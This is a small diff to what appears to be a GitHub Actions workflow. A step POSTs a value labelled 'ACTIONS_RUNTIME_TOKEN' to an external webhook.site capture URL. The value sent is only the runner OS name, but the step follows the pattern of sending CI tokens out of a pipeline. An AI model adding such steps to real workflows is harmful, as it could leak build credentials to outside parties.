@@ -30,7 +30,7 @@ jobs:
       with:
         url: 'https://webhook.site/5829b380-9ae8-4ae1-b555-07ba914246e3'
         method: 'POST'
-        data: 'ACTIONS_RUNTIME_TOKEN: $env.RUNNER_OS'
+        data: 'ACTIONS_RUNTIME_TOKEN: $env:RUNNER_OS;'
     # - uses: GuillaumeFalourd/wait-sleep-action@v1
     #   with:
     #     time: '2m'
